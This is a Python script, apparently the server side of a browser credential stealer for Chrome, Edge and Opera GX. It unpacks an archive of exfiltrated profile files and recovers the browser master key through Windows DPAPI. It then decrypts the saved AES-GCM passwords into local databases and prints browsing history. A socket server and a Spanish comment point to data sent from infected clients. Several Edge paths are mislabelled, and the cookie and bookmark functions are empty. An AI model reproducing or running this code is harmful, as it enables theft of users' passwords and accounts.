import sqlite3
import os
import json
import base64
import win32crypt
import Sockets.sckt_server as server
import shutil
from Cryptodome.Cipher import AES

#pip install pypiwin32
#pip install pycryptodomex

# Enviar de client a server , haciendo que en el serve se guarden en x sitio.

BasePath = "Data/"

PATH = {
    "CHROME_LOCAL_STATE_FILE_PATH": BasePath + "Chrome_Local_State",
    "CHROME_PASSWORDS_DB_PATH": BasePath + "Chrome_Login_Data",
    "CHROME_COOKIES_DB_PATH": BasePath + "Chrome_Cookies",
    "CHROME_HISTORY_DB_PATH": BasePath + "Chrome_History",
    "CHROME_BOOKMARKS_FILE_PATH": BasePath + "Chrome_Bookmarks",
    "EDGE_LOCAL_STATE_FILE_PATH": BasePath + "Edge_Local_State",
    "EDGE_PASSWORDS_DB_PATH": BasePath + "Edge_Login_Data",
    "EDGE_COOKIES_DB_PATH": BasePath + "Edge_History",
    "EDGE_BOOKMARKS_FILE_PATH": BasePath + "Edge_Bookmarks",
    "EDGE_HISTORY_DB_PATH": BasePath + "Edge_History",
    "OPERAGX_LOCAL_STATE_FILE_PATH": BasePath + "OPERAGX_Local_State",
    "OPERAGX_PASSWORDS_DB_PATH": BasePath + "OPERAGX_Login_Data",
    "OPERAGX_COOKIES_DB_PATH": BasePath + "OPERAGX_Cookies",
    "OPERAGX_HISTORY_DB_PATH": BasePath + "OPERAGX_History",
    "OPERAGX_BOOKMARKS_FILE_PATH": BasePath + "OPERAGX_Bookmarks",
}

SQL = {
    "LOGIN_DATA_SQL": "SELECT action_url, username_value, password_value FROM logins",
    "COOKIES_SQL": "SELECT host_key, name, encrypted_value, path, is_secure, is_httponly, creation_utc, expires_utc, last_access_utc FROM cookies;",
    "HISTORY_SQL": "SELECT url, title, visit_count, last_visit_time FROM urls;",
    "DOWNLOADS_SQL": "SELECT target_path, tab_url, total_bytes, start_time, end_time FROM downloads;"
}

def get_db_data(file,command,master_key=None):
    con = sqlite3.connect(PATH[file])
    cursor = con.cursor()
    cursor.execute(SQL[command])
    data = cursor.fetchall()

    return data

def run_server():
    server.server()

def unpack():
    return shutil.unpack_archive("Data123963.zip", "Data/")

def generate_cipher(master_key,ini_vector):
    return AES.new(master_key,AES.MODE_GCM,ini_vector)

def decrypt_payload(cipher,payload):
    return cipher.decrypt(payload)

def decrypt_pass(buffer,master_key):
    try:
        ini_vector = buffer[3:15]
        payload = buffer[15:]
        cipher = generate_cipher(master_key,ini_vector)
        psswd = decrypt_payload(cipher,payload)
        psswd = psswd[:-16].decode()
        return psswd
    except:
        try:
            psswd = win32crypt.CryptUnprotectData(buffer, None, None, None, 0)[1]
            return psswd
        except:
            pass

def master_Key(nav):
    global path

    if nav =="Chrome":
        path = PATH["CHROME_LOCAL_STATE_FILE_PATH"]
    elif nav == "Opera":
        path = PATH["OPERAGX_LOCAL_STATE_FILE_PATH"]
    elif nav == "Edge":
        path = PATH["EDGE_HISTORY_DB_PATH"]

    with open(path, "r") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_Key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_Key = master_Key[5:]
    master_Key = win32crypt.CryptUnprotectData(master_Key,None,None,None,0)[1]

    return master_Key

def get_pass(nav):

    global cnn
    global cnn1

    if nav =="Chrome":
        cnn = sqlite3.connect(PATH["CHROME_PASSWORDS_DB_PATH"])
        cnn1 = sqlite3.connect("chrome_pass.db")
    elif nav =="Opera":
        cnn = sqlite3.connect(PATH["OPERAGX_PASSWORDS_DB_PATH"])
        cnn1 = sqlite3.connect("operagx_pass.db")
    elif nav == "Edge":
        cnn = sqlite3.connect(PATH["EDGE_PASSWORDS_DB_PATH"])
        cnn1 = sqlite3.connect("edge_pass.db")

    cursor = cnn.cursor()
    cursor1 = cnn1.cursor()

    cursor.execute(SQL["LOGIN_DATA_SQL"])
    cursor1.execute('''CREATE TABLE passwords(url, username, password)''')
    try:
        for i in cursor.fetchall():
            decrypted_password = decrypt_pass(i[2], master_Key(nav))
            if decrypted_password:
                print(i[0],i[1],decrypted_password)
                cursor1.execute("INSERT INTO passwords (url, username, password) VALUES (?, ?, ?)", (i[0], i[1], decrypted_password))
                cnn1.commit()
    finally:
        cursor.close()
        cnn.close()

def get_historial(nav):

    global cnn

    if nav =="Chrome":
        cnn = sqlite3.connect(PATH["CHROME_HISTORY_DB_PATH"])
    elif nav =="Opera":
        cnn = sqlite3.connect(PATH["OPERAGX_HISTORY_DB_PATH"])
    elif nav == "Edge":
        cnn = sqlite3.connect(PATH["EDGE_COOKIES_DB_PATH"])

    cursor = cnn.cursor()

    cursor.execute(SQL["HISTORY_SQL"])

    try:
        for i in cursor.fetchall():
            print(i)
    except:
        pass

def get_cookies(nav):
    pass

def get_bookmarks(nav):
    pass

def main():
    options = { 1: run_server,
                2: unpack,
                3: get_pass,
                4: get_historial,
                5: get_cookies,
                6: get_bookmarks,
        }

    while True:
        print("1. Run Server")
        print("2. Unpack Data")
        print("3. Decrypt Passwrds and Generate a DB")
        print("4. Check Historial")
        print("5. Decrypt Cookies")
        print("6. Check Bookmarks")
        print("7. Cerrar")


        x = int(input())
        if x>0 or x<7:
            if x == 1 or x == 2:
                options[x]()
            if x == 3:
                print("1. Decrypt Chrome Passwrds and Generate a DB")
                print("2. Decrypt Edge Passwrds and Generate a DB")
                print("3. Decrypt OperaGX Passwrds and Generate a DB")
                y = int(input())
                if y == 1:
                    #Chrome
                    options[x]("Chrome")
                elif y == 2:
                    pass
                    #Edge
                    options[x]("Edge")
                elif y == 3:
                    #OperaGX
                    options[x]("Opera")
            if x == 4:
                print("1. Check Chrome Historial")
                print("2. Check Edge Historial")
                print("3. Check OperaGX Historial")
                y = int(input())
                if y == 1:
                    # Chrome
                    options[x]("Chrome")
                elif y == 2:
                    #Edge
                    options[x]("Edge")
                elif y == 3:
                    #OperaGX
                    options[x]("Opera")
            if x == 5:
                print("1. Decrypt Chrome Cookies")
                print("2. Decrypt Edge Cookies")
                print("3. Decrypt OperaGX Cookies")
                y = int(input())
                if y == 1:
                    # Chrome
                    options[x]("chrome")
                elif y == 2:
                    #Edge
                    options[x]("Edge")
                elif y == 3:
                    #OperaGX
                    options[x]("Opera")

            if x == 6:
                print("1. Check Chrome Bookmarks")
                print("2. Check Edge Bookmarks")
                print("3. Check OperaGX Bookmarks")
                y = int(input())
                if y == 1:
                    # Chrome
                    options[x]("chrome")
                elif y == 2:
                    #Edge
                    options[x]("Edge")
                elif y == 3:
                    #OperaGX
                    options[x]("Opera")

            if x == 7:
                break
        else:
            pass

if __name__ == "__main__":
    main()
